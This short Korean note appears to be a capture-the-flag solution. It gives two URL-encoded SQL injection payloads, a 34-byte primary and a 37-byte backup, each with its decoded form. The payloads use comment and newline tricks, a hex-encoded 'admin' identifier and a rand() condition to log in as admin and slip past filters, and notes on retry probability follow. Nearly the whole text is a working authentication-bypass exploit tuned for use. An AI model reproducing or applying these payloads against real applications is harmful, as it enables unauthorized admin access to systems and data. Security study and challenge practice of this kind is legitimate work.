# 530점짜리 PAYLOAD (34 byte)
1%23%27%0aor%20id=0x61646d696e%26%26rand()%3c.5%23

URL-decoded: `1#'<LF>or id=0x61646d696e&&rand()<.5#`

# 백업: 515점짜리 PAYLOAD (37 byte) — `&&` 대신 `and`
1%23%27%0aor%20id=0x61646d696e%20and%20rand()%3c.5%23

URL-decoded: `1#'<LF>or id=0x61646d696e and rand()<.5#`

주의점)
1. Deterministic하게 동작할 필요 없고 한번만 동작해도 됌.
2. 세 sandbox + 최종 통과를 모두 만족할 확률은 호출당 50%의 4-콜 독립 → 1/16. 원본 480pt와 동일.
3. 평균 16회, 95-percentile 약 50회 반복 필요.
